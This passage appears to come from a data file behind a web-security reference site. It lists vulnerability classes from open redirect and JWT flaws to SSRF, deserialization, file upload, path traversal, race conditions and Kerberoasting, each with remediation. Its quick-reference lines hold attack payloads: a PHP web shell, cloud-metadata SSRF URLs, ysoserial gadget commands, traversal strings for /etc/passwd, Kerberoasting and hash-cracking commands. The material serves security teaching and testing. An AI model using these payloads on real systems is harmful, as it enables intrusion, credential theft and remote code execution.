              "Validate input structure with a strict schema rather than deep-merging arbitrary objects."
            ]
          }
        ]
      },
      {
        id: "open-redirect",
        name: "Open Redirect",
        severity: "Low",
        ref: "https://cwe.mitre.org/data/definitions/601.html",
        description: "A redirect target taken from user input sends victims to attacker sites, aiding phishing and token theft.",
        brief: "An open redirect exists when an application redirects to a URL taken from user-controllable input without validating it. On its own it is low severity — but it lends a trusted domain to phishing links, and it becomes serious when chained: leaking OAuth tokens or authorization codes via a redirect_uri, or bouncing through to an SSRF or XSS.\n\nThe fix is to never redirect to a raw user-supplied absolute URL; use an allow-list or relative paths only.",
        quickReference: [
          { label: "Basic test", cmd: "?next=https://evil.com   ?url=//evil.com   ?redirect=https:evil.com" },
          { label: "Filter bypasses", cmd: "//evil.com   https:/\\evil.com   https://target.com@evil.com   /\\/evil.com" },
          { label: "OAuth token theft angle", cmd: "redirect_uri=https://evil.com  — leaks code/token if not strictly matched" },
          { label: "Where to look", cmd: "Login/logout next=, return_to, callback, url, dest parameters" }
        ],
        sections: [
          {
            title: "Common Bypasses",
            type: "table",
            columns: ["Filter", "Bypass"],
            rows: [
              ["Blocks http/https", "Protocol-relative //evil.com"],
              ["Requires leading /", "/\\evil.com or /%2f/evil.com — browsers normalise oddly"],
              ["Allow-list by substring", "https://target.com.evil.com or https://evil.com/target.com"],
              ["Uses @ parsing", "https://target.com@evil.com (everything before @ is userinfo)"],
              ["Backslash quirks", "https:/\\/\\evil.com and mixed slashes"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Phishing credibility", "A link on the trusted domain that lands on an attacker page"],
              ["OAuth/token leakage", "A loose redirect_uri leaks the auth code or access token"],
              ["Chained exploitation", "Escalate to SSRF, XSS (javascript: / data:), or filter bypass"],
              ["Cookie/session leakage", "Redirect through a logging endpoint that captures the URL"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not redirect to user-supplied absolute URLs. Prefer relative paths, or map an input key to a server-side allow-list of destinations.",
              "If external redirects are required, validate against a strict allow-list of exact hosts and reject everything else.",
              "For OAuth, require exact redirect_uri matching — no wildcards, no prefix matching.",
              "Show an interstitial 'you are leaving this site' page for any off-site redirect.",
              "Normalise and parse the URL with a robust library before validating; do not use naive string checks."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Access Control & Authentication",
    vulns: [
      {
        id: "idor",
        name: "IDOR / Broken Access Control",
        severity: "High",
        ref: "https://portswigger.net/web-security/access-control",
        description: "The app trusts a client-supplied identifier without checking ownership, exposing other users' data or actions.",
        brief: "Broken access control is the most common serious web weakness, and IDOR (Insecure Direct Object Reference) is its signature form: an endpoint accepts an object identifier — a user ID, order number, document GUID — and returns or modifies that object without verifying the requester is authorised for it. Change the ID, get someone else's data.\n\nIt covers horizontal access (reaching a peer's resources), vertical access (reaching admin functionality), and missing function-level checks. The root cause is authorising on what the client sends rather than on the authenticated identity.",
        quickReference: [
          { label: "Horizontal IDOR", cmd: "GET /api/account/1001  ->  change to 1002" },
          { label: "Method / function abuse", cmd: "POST /api/user/1002/role  as a normal user" },
          { label: "Guess/enumerate identifiers", cmd: "Sequential IDs, predictable GUIDs, base64'd IDs in cookies/params" },
          { label: "Force-browse admin paths", cmd: "/admin, /api/internal, hidden endpoints from JS/archives" }
        ],
        sections: [
          {
            title: "Forms of Broken Access Control",
            type: "table",
            columns: ["Form", "Description"],
            rows: [
              ["Horizontal IDOR", "Access another user's resource at the same privilege level"],
              ["Vertical escalation", "A low-priv user reaches admin functionality"],
              ["Missing function-level check", "The UI hides an action but the endpoint does not enforce the role"],
              ["Mass/parameter-based", "Passing role=admin or userId= that the server trusts"],
              ["Multi-step bypass", "Skipping a step that carries the real authorization check"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Technique", "Detail"],
            rows: [
              ["Two accounts", "Do an action as user A, replay it as user B (or with B's session) — Burp Autorize automates this"],
              ["Change the identifier", "Increment/replace IDs, GUIDs, and encoded references"],
              ["Change the method", "Try PUT/DELETE where only GET is exposed"],
              ["Remove/alter role hints", "Strip a role parameter or set it to a higher value"],
              ["Force browsing", "Request admin/internal endpoints discovered in JS or archives directly"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Mass data exposure", "Enumerate every user's records via a sequential ID"],
              ["Account takeover", "Change another user's email/password"],
              ["Privilege escalation", "Reach admin functions as a normal user"],
              ["Unauthorised actions", "Modify or delete resources you do not own"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce authorization server-side on every request, based on the authenticated session — never trust an ID or role sent by the client.",
              "Check ownership: does this user own or have rights to this specific object? Do it in the data layer, consistently.",
              "Deny by default; require an explicit grant for each function and object, and centralise the checks.",
              "Do not rely on unpredictable IDs (GUIDs) as an access control — obscurity is not authorization, though it slows enumeration.",
              "Test access control with least-privilege accounts as part of every release; it is logic, so scanners miss most of it."
            ]
          }
        ]
      },
      {
        id: "auth-bypass",
        name: "Authentication Bypass",
        severity: "Critical",
        ref: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        description: "Flaws in login, session, or recovery logic that let an attacker authenticate without valid credentials.",
        brief: "Authentication is meant to prove who you are; a bypass defeats that proof. The weaknesses are diverse — logic flaws in the login flow, broken multi-factor steps, predictable or improperly invalidated session tokens, and flawed password-reset mechanisms — but they share an outcome: access to an account without the legitimate credential.\n\nThis entry covers the flow-level failures; injection-based bypasses (SQL/NoSQL/LDAP) and token forgery (JWT) have their own entries.",
        quickReference: [
          { label: "MFA step skippable", cmd: "Complete step 1, then request the post-MFA endpoint directly" },
          { label: "Response tampering", cmd: "Change {\"success\":false} / 2FA result at the client where the server trusts it" },
          { label: "Password reset flaws", cmd: "Predictable token, token not bound to user, host-header poisoning of reset link" },
          { label: "Session issues", cmd: "Session not rotated on login, weak/guessable IDs, no expiry, fixation" }
        ],
        sections: [
          {
            title: "Common Bypass Classes",
            type: "table",
            columns: ["Class", "Example"],
            rows: [
              ["Broken MFA", "The second factor is not enforced server-side, or its verified state can be forged/skipped"],
              ["Logic flaws", "Register/login race conditions, unverified email accepted, 'remember me' that never checks"],
              ["Session management", "No rotation on privilege change, predictable tokens, missing invalidation on logout"],
              ["Password reset", "Guessable reset tokens, tokens reusable or not user-bound, reset link host from Host header"],
              ["Default/weak accounts", "Leftover test/admin accounts and default credentials"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Test", "Detail"],
            rows: [
              ["Map the full flow", "Every step and every endpoint; try reaching later steps directly"],
              ["Tamper client signals", "Flip success flags, MFA-passed booleans, role values the server may trust"],
              ["Attack password reset", "Inspect token entropy, binding, reuse, and the link-generation source"],
              ["Analyse tokens", "Session/reset token randomness, expiry, rotation, and invalidation behaviour"],
              ["Try known/default creds", "admin/admin and product defaults on admin panels"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Account takeover", "Full access to a victim's account and data"],
              ["MFA defeat", "Access despite a second factor being 'required'"],
              ["Mass compromise", "A systemic reset/session flaw affects all users"],
              ["Privileged access", "Bypass into an admin account"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce every authentication step server-side; never trust a client-provided flag that a factor was satisfied.",
              "Rotate the session identifier on login and on any privilege change; invalidate sessions fully on logout and reset.",
              "Generate reset/verification tokens with high entropy, bind them to the user, expire them quickly, and allow one use.",
              "Do not build reset links from the Host header; use a fixed, configured base URL.",
              "Remove default and test accounts, enforce MFA on sensitive accounts, and rate-limit authentication endpoints."
            ]
          }
        ]
      },
      {
        id: "jwt-vulns",
        name: "JWT Vulnerabilities",
        severity: "High",
        ref: "https://portswigger.net/web-security/jwt",
        description: "Implementation flaws in JSON Web Tokens — alg confusion, none, weak secrets — enabling token forgery.",
        brief: "JWTs carry identity and claims in a signed token the server verifies without server-side session state. That design shifts trust onto the signature, and a set of well-known implementation mistakes break it: accepting the 'none' algorithm, confusing RS256 with HS256 so the public key becomes the HMAC secret, weak signing secrets that crack offline, and unvalidated claims.\n\nWhen verification is broken, an attacker forges a token with any identity or role they like — instant privilege escalation or account takeover.",
        quickReference: [
          { label: "alg: none", cmd: "Set header alg to \"none\", strip the signature — some libs accept it" },
          { label: "Key confusion RS256->HS256", cmd: "Sign HS256 using the RSA public key as the HMAC secret" },
          { label: "Crack the HMAC secret", cmd: "jwt_tool <token> -C -d wordlist.txt   (hashcat -m 16500)" },
          { label: "Tamper claims", cmd: "Change \"role\":\"user\" -> \"admin\" (only works if the sig check is broken)" }
        ],
        sections: [
          {
            title: "Attack Classes",
            type: "table",
            columns: ["Attack", "Condition"],
            rows: [
              ["alg: none", "Library honours an unsigned token when alg is none/None/NONE"],
              ["Key confusion", "Server verifies RS256 tokens with an HS256 code path using the public key"],
              ["Weak HMAC secret", "Short/guessable secret cracks offline, then forge anything"],
              ["kid / jku / x5u abuse", "Header injects a key path (traversal/SQLi) or points key retrieval at attacker infra"],
              ["Missing claim checks", "exp/aud/iss not validated — replay or cross-service token use"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Decode and read alg", "The header's alg determines which attacks even apply"],
              ["Run the playbook", "jwt_tool -M at against a live endpoint tries none, confusion, and more"],
              ["Test secret strength", "Attempt an offline crack of the HMAC secret"],
              ["Probe key headers", "Manipulate kid/jku/x5u to control the verification key"],
              ["Check claim validation", "Alter exp/aud/iss and see if the token is still accepted"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Privilege escalation", "Forge a token with an admin role"],
              ["Account takeover", "Forge a token for any user (sub/username)"],
              ["Auth bypass", "Unsigned/forged token accepted as valid"],
              ["Cross-service abuse", "Reuse a token where aud/iss are not enforced"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Pin the expected algorithm server-side and reject any token whose alg does not match; never allow 'none'.",
              "Do not use a verification routine that selects the algorithm from the token header — that is the root of key confusion.",
              "Use a long, high-entropy signing secret for HMAC, or asymmetric keys managed properly; rotate on suspicion.",
              "Validate exp, aud, and iss on every request; keep token lifetimes short and support revocation for sensitive actions.",
              "Do not trust key-location headers (jku/x5u) unless the URL is strictly allow-listed."
            ]
          }
        ]
      },
      {
        id: "mass-assignment",
        name: "Mass Assignment",
        severity: "High",
        ref: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
        description: "The app binds request fields straight to objects, letting attackers set properties they shouldn't control.",
        brief: "Mass assignment (auto-binding, over-posting) happens when a framework maps incoming request parameters directly onto an internal object or model. If the binding is not restricted, an attacker adds fields the developer never intended to expose — isAdmin, role, balance, verified — and the framework dutifully sets them.\n\nIt is common in modern API frameworks that make object binding effortless, and it turns an ordinary update endpoint into a privilege-escalation primitive.",
        quickReference: [
          { label: "Add a privileged field", cmd: "{\"username\":\"x\",\"email\":\"y\",\"isAdmin\":true}" },
          { label: "Escalate role on update", cmd: "PATCH /api/users/me  {\"role\":\"admin\"}" },
          { label: "Tamper server-owned fields", cmd: "\"balance\":100000   \"verified\":true   \"id\":<other user>" },
          { label: "Discover fields", cmd: "Read a GET response / JS to learn object properties, then set them on write" }
        ],
        sections: [
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Enumerate object fields", "A GET on the resource reveals the property names to try setting"],
              ["Add unexpected fields", "Append role/isAdmin/verified/owner to a create or update request"],
              ["Watch for silent binding", "The field is accepted and persisted even though the UI never offered it"],
              ["Try nested/related objects", "Bind through relationships (e.g. user.roles) where supported"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Privilege escalation", "Set isAdmin/role and become an administrator"],
              ["Business-data tampering", "Change price, balance, ownership, or status fields"],
              ["Account takeover", "Reassign an object's owner/user to yourself"],
              ["Verification bypass", "Flip verified/approved flags"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Bind to an explicit allow-list of fields (a DTO / view model), never directly to the database entity.",
              "Use the framework's field-whitelisting (strong params, @JsonIgnore, ignore/exclude lists) and default to deny.",
              "Set sensitive fields (role, owner, price) only in server-side code paths, never from request binding.",
              "Separate read models from write models so response shape does not dictate what is writable.",
              "Add tests that attempt to over-post privileged fields and assert they are ignored."
            ]
          }
        ]
      },
      {
        id: "business-logic",
        name: "Business Logic Flaws",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/logic-flaws",
        description: "The application enforces its rules incorrectly, letting valid requests achieve invalid outcomes.",
        brief: "Business logic flaws are failures in how an application's rules and workflows are enforced, rather than a classic injection or encoding bug. Every request may be individually well-formed, yet the sequence or combination produces an outcome the business never intended — a negative quantity that credits money, a coupon applied infinitely, a step skipped, a limit not enforced server-side.\n\nThey are invisible to scanners because nothing is malformed; finding them requires understanding what the application is supposed to guarantee and then breaking that assumption.",
        quickReference: [
          { label: "Value manipulation", cmd: "quantity=-1   price=0   currency swap   over-long/negative inputs" },
          { label: "Step skipping", cmd: "Jump straight to the confirmation/fulfilment endpoint" },
          { label: "Limit abuse", cmd: "Reuse a one-time coupon / referral; exceed a per-account cap" },
          { label: "State confusion", cmd: "Cancel-after-fulfil, refund + keep, concurrent requests (see Race Conditions)" }
        ],
        sections: [
          {
            title: "Common Patterns",
            type: "table",
            columns: ["Pattern", "Example"],
            rows: [
              ["Trusting client values", "Price/discount/total computed or sent by the client and accepted"],
              ["Missing server-side limits", "Quantity, balance, or rate checks only enforced in the UI"],
              ["Workflow step skipping", "Reaching a later state without completing required prior steps"],
              ["Insufficient validation", "Negative numbers, integer overflow, currency or unit confusion"],
              ["Assumption breaking", "Doing steps out of order, or in parallel, in ways the design never expected"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Approach", "Detail"],
            rows: [
              ["Model the intent", "Write down what each workflow is supposed to guarantee, then attack that guarantee"],
              ["Tamper every value", "Negative, zero, huge, wrong-type, and someone-else's values"],
              ["Reorder and skip", "Replay steps out of sequence; call endpoints directly"],
              ["Test limits", "Push past quotas, reuse single-use items, and combine discounts"],
              ["Concurrency", "Fire simultaneous requests to break assumptions (overlaps with race conditions)"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Financial loss", "Free goods, negative charges, infinite discounts, refund abuse"],
              ["Policy bypass", "Circumvent limits, approvals, or entitlements"],
              ["Data integrity", "Objects left in impossible or inconsistent states"],
              ["Fraud", "Loyalty/referral/coupon abuse at scale"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce all business rules server-side; treat the client as untrusted for prices, totals, quantities, and state.",
              "Recompute security- and money-relevant values on the server from trusted data, never accept them from the request.",
              "Validate value ranges and types strictly (no negatives where nonsensical, no overflow).",
              "Enforce workflow order and idempotency server-side; verify each step's preconditions.",
              "Threat-model each critical workflow and add abuse-case tests — scanners will not find these for you."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Server-Side",
    vulns: [
      {
        id: "ssrf",
        name: "Server-Side Request Forgery (SSRF)",
        severity: "High",
        ref: "https://portswigger.net/web-security/ssrf",
        description: "The server is tricked into making requests to attacker-chosen URLs, reaching internal services and cloud metadata.",
        brief: "SSRF occurs when an application fetches a URL supplied or influenced by the user and does not restrict where that request can go. The attacker points it at internal-only services, the loopback interface, or the cloud metadata endpoint — and the server, trusted inside the network, makes the request on their behalf.\n\nIt is especially dangerous in cloud environments, where the metadata service (169.254.169.254) hands out temporary credentials to anything that can reach it. SSRF is a frequent first step toward internal compromise.",
        quickReference: [
          { label: "Cloud metadata (AWS)", cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
          { label: "Internal / loopback", cmd: "http://127.0.0.1:8080/   http://localhost/admin   http://10.0.0.5/" },
          { label: "Filter bypasses", cmd: "http://127.1   http://0177.0.0.1   http://[::1]   http://2130706433/   DNS rebinding" },
          { label: "Blind SSRF", cmd: "Point at a Collaborator/OAST host to confirm the server made the request" }
        ],
        sections: [
          {
            title: "Where It Hides",
            type: "table",
            columns: ["Feature", "Why"],
            rows: [
              ["URL fetchers", "Webhooks, URL preview, 'import from URL', PDF/screenshot generators"],
              ["File/image processors", "Servers that fetch remote images or follow embedded references"],
              ["Integrations", "Callbacks, OAuth discovery, XML/SVG (see XXE), and API proxies"],
              ["Redirect following", "A fetch that follows redirects can be sent inward after passing a filter"]
            ]
          },
          {
            title: "Filter Bypasses",
            type: "table",
            columns: ["Defence", "Bypass"],
            rows: [
              ["Block 'localhost'/127.0.0.1", "127.1, 0.0.0.0, 0177.0.0.1 (octal), 2130706433 (decimal), [::1], 127.0.0.1.nip.io"],
              ["Allow-list a domain", "attacker-domain that resolves to an internal IP; or user@internal in the URL"],
              ["Block internal on first request", "Open redirect on an allowed host, or DNS rebinding (TOCTOU)"],
              ["Scheme filtering", "file://, gopher://, dict:// where the client library supports them"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Cloud credential theft", "Read IAM/metadata credentials, then act as the instance role"],
              ["Internal recon & access", "Port-scan and reach internal-only services and admin panels"],
              ["Data exfiltration", "Pull internal responses back through the vulnerable app"],
              ["Escalation", "Chain to RCE via internal services (e.g. unauthenticated admin APIs)"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Allow-list the exact hosts/schemes the feature legitimately needs; deny everything else, including redirects to new hosts.",
              "Resolve the hostname and validate the resulting IP is public before connecting, and re-validate after redirects to defeat rebinding.",
              "Block link-local (169.254.0.0/16), loopback, and RFC1918 ranges at the application and network layers.",
              "Enforce IMDSv2 (session-token metadata) in AWS and equivalent hardening in other clouds; restrict metadata access.",
              "Isolate the fetching service on a segmented network with strict egress controls."
            ]
          }
        ]
      },
      {
        id: "insecure-deserialization",
        name: "Insecure Deserialization",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/deserialization",
        description: "Deserializing attacker-controlled data instantiates dangerous object graphs, often leading to RCE.",
        brief: "Serialization turns objects into a byte/stream format; deserialization rebuilds them. When an application deserializes data an attacker controls, and the runtime's classpath contains suitable 'gadget' classes, a crafted object graph triggers a chain of method calls during reconstruction — frequently ending in command execution.\n\nIt affects Java, .NET, PHP, Python (pickle), Ruby, and Node, and it is critical because it is often reachable in cookies, hidden fields, view state, and message queues without any special privilege.",
        quickReference: [
          { label: "Java serialized blob (spot it)", cmd: "Base64 starting rO0AB...   raw bytes AC ED 00 05" },
          { label: "Generate a Java gadget", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
          { label: "Safe detection (no RCE)", cmd: "ysoserial URLDNS \"http://you.oastify.com\"  — a DNS hit confirms the sink" },
          { label: ".NET ViewState / PHP", cmd: "ysoserial.net for __VIEWSTATE; PHP object injection via unserialize()" }
        ],
        sections: [
          {
            title: "Where the Data Enters",
            type: "table",
            columns: ["Location", "Format"],
            rows: [
              ["Cookies / hidden fields", "Serialized session or state objects"],
              ["ASP.NET __VIEWSTATE", ".NET serialized state (attack with ysoserial.net)"],
              ["APIs / message queues", "RMI, JMX, T3 (WebLogic), AMQP payloads"],
              ["File uploads", "Objects/session files the app deserializes"],
              ["Content-Type tells", "application/x-java-serialized-object; PHP unserialize() inputs"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Spot serialized data", "rO0AB / AC ED (Java), ViewState, PHP O:/a: patterns in traffic"],
              ["Confirm safely", "Send a URLDNS payload with an OOB callback — a lookup proves deserialization without RCE"],
              ["Identify gadgets", "Probe likely libraries (CommonsCollections, etc.); errors reveal the stack"],
              ["Weaponise", "Swap in a benign command once a chain lands"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Remote code execution", "The headline outcome with a working gadget chain"],
              ["Auth/logic bypass", "Tamper serialized fields (roles, flags) even without RCE"],
              ["Denial of service", "Object graphs that exhaust CPU/memory on load"],
              ["Full compromise", "RCE as the app process, then internal pivoting"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not deserialize untrusted data. Where you must exchange objects, use a simple data format (JSON) with a strict schema and no type resolution.",
              "If native deserialization is unavoidable, use allow-list-based look-ahead deserialization that permits only expected classes.",
              "Sign and integrity-check any serialized state you must round-trip through the client (e.g. keyed HMAC on ViewState).",
              "Keep gadget-prone libraries updated and removed where unused; monitor for deserialization advisories.",
              "Confirm findings with a benign OOB payload (URLDNS) rather than firing RCE on production."
            ]
          }
        ]
      },
      {
        id: "file-upload",
        name: "Unrestricted File Upload",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
        description: "Weak upload validation lets an attacker place executable or malicious files on the server.",
        brief: "File upload becomes dangerous when the application does not properly restrict what can be uploaded and where it lands. If an attacker can upload a server-executable file (a web shell) into a web-accessible, executable directory, the result is remote code execution. Even without execution, weak handling enables stored XSS (SVG/HTML), path traversal, and denial of service.\n\nThe common failures are trusting the client-supplied filename or Content-Type, checking only the extension, and storing uploads under the web root where they can be requested and run.",
        quickReference: [
          { label: "Web shell (PHP)", cmd: "shell.php  ->  <?php system($_GET['c']); ?>" },
          { label: "Extension bypasses", cmd: "shell.php.jpg   shell.pHp   shell.phtml   shell.php%00.jpg   double extension" },
          { label: "Content-Type / magic-byte spoof", cmd: "Send image/png with GIF89a header + PHP payload" },
          { label: "Non-RCE impact", cmd: "malicious.svg (stored XSS), ../../ in filename (path traversal)" }
        ],
        sections: [
          {
            title: "Validation Bypasses",
            type: "table",
            columns: ["Check", "Bypass"],
            rows: [
              ["Extension allow-list", "Alternate exec extensions (.phtml, .php5, .asp;.jpg), case tricks, double extensions"],
              ["Client Content-Type", "Trivially forged in the request"],
              ["Magic-byte check only", "Prepend a valid image header, append the payload (polyglot)"],
              ["Blacklist of extensions", "Miss one variant, or rely on .htaccess/web.config upload to enable execution"],
              ["Filename trust", "../ path traversal to write outside the intended directory"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Upload a benign test", "Learn where files land and whether the path is predictable and web-accessible"],
              ["Probe execution", "Try to get a server-side script to execute at its stored URL"],
              ["Bypass filters", "Iterate extensions, Content-Type, and magic bytes"],
              ["Try non-exec impact", "SVG/HTML for stored XSS; traversal in the filename"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Remote code execution", "Web shell executes on the server"],
              ["Stored XSS", "SVG/HTML served inline runs script in viewers' browsers"],
              ["Path traversal / overwrite", "Write files outside the upload directory"],
              ["Denial of service", "Huge files or decompression bombs exhaust resources"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Store uploads outside the web root, or in storage that cannot execute code, and serve them via a handler — never let the upload directory run scripts.",
              "Validate with a strict allow-list of extensions AND verified content type; generate a random server-side filename and set the extension yourself.",
              "Serve downloads with Content-Disposition: attachment and a correct Content-Type; force SVG/HTML to download rather than render.",
              "Enforce size limits and scan for malware; re-encode images to strip embedded payloads.",
              "Never use the client-supplied filename for the stored path; strip directory components entirely."
            ]
          }
        ]
      },
      {
        id: "path-traversal",
        name: "Path Traversal / LFI / RFI",
        severity: "High",
        ref: "https://portswigger.net/web-security/file-path-traversal",
        description: "User input in a file path escapes the intended directory to read (or include and execute) arbitrary files.",
        brief: "Path traversal (directory traversal) occurs when user input is used to build a filesystem path without proper validation, letting an attacker use ../ sequences to reach files outside the intended directory. When the file is merely read, it is Local File Inclusion — leaking source code, config, and secrets. When the platform executes included files (classically PHP), it becomes Local or Remote File Inclusion and can reach code execution.\n\nThe defect is trusting user input to name a file; the fix is to never build a path from raw input.",
        quickReference: [
          { label: "Basic traversal", cmd: "?file=../../../../etc/passwd   ?page=..\\..\\windows\\win.ini" },
          { label: "Encoding bypasses", cmd: "%2e%2e%2f   ..%252f (double)   ....//   %c0%ae (overlong)" },
          { label: "PHP LFI wrappers", cmd: "php://filter/convert.base64-encode/resource=index.php   php://input   data://" },
          { label: "Log poisoning -> RCE", cmd: "Poison an accessible log (UA/headers) with PHP, then LFI-include it" }
        ],
        sections: [
          {
            title: "Bypasses",
            type: "table",
            columns: ["Defence", "Bypass"],
            rows: [
              ["Strips ../", "Nested ....// so one removal leaves ../ ; or absolute path /etc/passwd"],
              ["URL-decodes once", "Double-encode: ..%252f"],
              ["Requires an extension", "Null byte %00 (legacy), or a php://filter wrapper to still read"],
              ["Allow-list a prefix", "Start with the allowed prefix, then traverse out of it"],
              ["Blocks encodings", "Overlong UTF-8 (%c0%ae) on some stacks"]
            ]
          },
          {
            title: "LFI vs RFI",
            type: "table",
            columns: ["Variant", "Detail"],
            rows: [
              ["LFI (read)", "Include/read a local file — source, config, /etc/passwd, keys"],
              ["LFI to RCE", "Include a file you can control: uploaded file, poisoned log, /proc/self/environ, PHP session"],
              ["RFI", "Include a remote URL (requires allow_url_include) — direct RCE, now rare by default"],
              ["Wrappers", "php://filter to exfiltrate source; data:// / php://input to inject code"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Source/secret disclosure", "Read application source, .env, config, private keys"],
              ["Credential theft", "DB creds and API keys from config files"],
              ["Remote code execution", "Via inclusion of controllable content (LFI->RCE, RFI)"],
              ["Further recon", "Read /etc/passwd, process env, and internal paths"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not build file paths from user input. Map an input key to a fixed server-side list of allowed files instead.",
              "If a path component is unavoidable, canonicalise it and verify the resolved path stays within the intended base directory.",
              "Strip path separators and traversal sequences after decoding, and reject absolute paths and wrappers.",
              "Disable dangerous include features (allow_url_include/allow_url_fopen in PHP) and run with least filesystem privilege.",
              "Keep secrets out of web-readable locations so a read primitive yields less."
            ]
          }
        ]
      },
      {
        id: "race-condition",
        name: "Race Conditions",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/race-conditions",
        description: "Concurrent requests hit a check-then-act window, letting a limited action happen more times than allowed.",
        brief: "A race condition (TOCTOU — time-of-check to time-of-use) exists when an application checks a condition and then acts on it non-atomically, so two requests sent close together both pass the check before either completes the action. The result is a limit enforced once being applied many times: a gift card redeemed twice, a single-use coupon reused, a withdrawal exceeding the balance.\n\nModern tooling (Burp's single-packet attack / Turbo Intruder) makes these windows exploitable even when they are only microseconds wide.",
        quickReference: [
          { label: "The idea", cmd: "Send N identical requests simultaneously to beat a check-then-act gap" },
          { label: "Tooling", cmd: "Burp Repeater 'Send group in parallel' (single-packet attack); Turbo Intruder" },
          { label: "Classic targets", cmd: "Redeem code/coupon, apply discount, withdraw/transfer, vote/like, register username" },
          { label: "Signal", cmd: "The action succeeds more times than the limit should allow" }
        ],
        sections: [
          {
            title: "Vulnerable Patterns",
            type: "table",
            columns: ["Pattern", "Example"],
            rows: [
              ["Limit check then apply", "Balance/quantity/quota verified, then decremented in a separate step"],
              ["Single-use tokens", "Coupon/gift-card marked used after the benefit is granted"],
              ["Uniqueness checks", "Register the same username/email in parallel before the unique constraint bites"],
              ["State transitions", "Approve/cancel/refund fired concurrently to reach an inconsistent state"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Identify limited actions", "Anything with a 'once' or a cap tied to money or entitlement"],
              ["Send in parallel", "Use the single-packet attack to land requests within the same window"],
              ["Compare to baseline", "Did the benefit apply more times than allowed?"],
              ["Tune concurrency", "Vary the number of parallel requests and timing"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Financial loss", "Multi-redeem credits, over-limit withdrawals, duplicated refunds"],
              ["Limit bypass", "Exceed per-user caps and single-use restrictions"],
              ["Data inconsistency", "Duplicate records or impossible states"],
              ["Fraud at scale", "Automated abuse of coupons/referrals"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Make check-and-act atomic: use database transactions with appropriate isolation, or atomic operations (SELECT ... FOR UPDATE, conditional updates).",
              "Enforce uniqueness and limits with database constraints, not application-level checks alone.",
              "Use idempotency keys for sensitive operations so repeats are safely ignored.",
              "Lock or serialise per-resource operations (e.g. per-account) where a race would be costly.",
              "Test concurrency explicitly with parallel requests as part of security testing."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    vulns: [
      {
        id: "kerberoasting-vuln",
        name: "Kerberoasting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1558/003/",
        theory: "theory/2026-08-18-kerberoasting.html",
        description: "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords.",
        brief: "Kerberoasting abuses a normal Kerberos feature: any authenticated user can request a service ticket for any account that has a Service Principal Name, and that ticket is encrypted with the service account's password-derived key. The attacker requests tickets for service accounts and cracks them offline — no elevated privilege, no noisy behaviour, just a standard ticket request.\n\nService accounts are frequently over-privileged and have weak, never-rotated passwords, so a cracked one is often a direct route to high privilege. See the Kerberoasting theory page for the full mechanism.",
        quickReference: [
          { label: "Request roastable tickets (Linux)", cmd: "GetUserSPNs.py -request -dc-ip <dc> corp.local/user:pass -outputfile hashes.txt" },
          { label: "Rubeus (Windows)", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt" },
          { label: "Crack", cmd: "hashcat -m 13100 hashes.txt rockyou.txt" },
          { label: "Find targets (LDAP)", cmd: "(&(objectClass=user)(servicePrincipalName=*))" }
        ],
        sections: [
          {
            title: "Preconditions & Signal",
            type: "table",
            columns: ["Item", "Detail"],
            rows: [
              ["Requires", "Any valid domain credential"],
              ["Target", "Accounts with a servicePrincipalName set (service accounts)"],
